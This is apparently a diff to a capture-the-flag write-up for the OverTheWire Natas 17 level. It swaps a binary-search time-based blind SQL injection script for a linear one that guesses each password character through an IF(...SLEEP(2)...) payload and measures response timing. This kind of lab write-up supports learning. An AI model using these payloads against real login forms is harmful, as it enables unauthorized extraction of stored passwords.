@@ -2,8 +2,7 @@
 
 **Category:** OverTheWire / Natas  
 **Difficulty:** Hard  
-**Date:** 2026-08-24  
-**Level page:** [natas17.html](https://overthewire.org/wargames/natas/natas17.html)
+**Date:** 2026-08-24
 
 ## Goal
 
@@ -44,26 +43,31 @@ The page itself never showed anything either way — just the empty output box a
 
 ![Blank output regardless of the injected condition](images/natas-17-18-blank-output.png)
 
-With a working true/false timing oracle, wrote a script to recover the password with a binary search per character instead of trying every character linearly — much fewer requests per position:
+With a working true/false timing oracle, wrote a script to recover the password one character at a time, trying every character in the charset for each position until the timing confirms a match:
 
     payload = (
-        f'natas18" AND '
-        f'IF(ASCII(SUBSTRING(password,{pos},1))>{mid},'
+        f'natas18" AND IF('
+        f'BINARY SUBSTRING(password,1,{position})='
+        f'"{password + char}",'
         f'SLEEP(2),0)#'
     )
 
-    start = time.time()
-    s.post(URL, data={"username": payload}, timeout=5)
-    elapsed = time.time() - start
+    response = requests.post(
+        URL,
+        data={"username": payload},
+        auth=AUTH,
+        timeout=5,
+    )
 
-    if elapsed > 1.5:
-        low = mid + 1
-    else:
-        high = mid
+    elapsed = response.elapsed.total_seconds()
 
-For each of the 32 positions, this binary-searches the ASCII value of that character between 32 and 126 — a slow response (>1.5s) means the real character's ASCII value is higher than the midpoint, a fast one means it's lower or equal, narrowing the range until the exact character is found.
+    if elapsed > 2:
+        password += char
+        break
 
-![solve.py doing a binary search per character using response timing as the oracle](images/natas-17-18-solve-script.png)
+For each position, this checks whether the password's prefix so far (`password + char`) matches the real password's first `position` characters — `BINARY` keeps it case-sensitive. A ~2s response confirms that character is correct, and the loop moves on to the next position.
+
+![solve.py trying each character per position, using response timing as the oracle](images/natas-17-18-solve-script.png)
 
 Ran it and watched each position resolve in turn:
 
@@ -89,4 +93,4 @@ All 32 positions eventually resolved to the full password:
 
 ## Key Takeaway
 
-Removing every visible difference between a true and false query doesn't remove the injection — it just forces the oracle into a different channel. `IF(condition, SLEEP(n), 0)` turns response latency itself into a boolean signal, and combining that with `ASCII(SUBSTRING(...))` and a binary search per character keeps the number of requests manageable (about 7 per character instead of up to 94) even with no output to read at all.
+Removing every visible difference between a true and false query doesn't remove the injection — it just forces the oracle into a different channel. `IF(condition, SLEEP(n), 0)` turns response latency itself into a boolean signal: a slow response confirms the guessed prefix is correct, a fast one means try the next character. No output ever needs to come back for the data to be extractable.
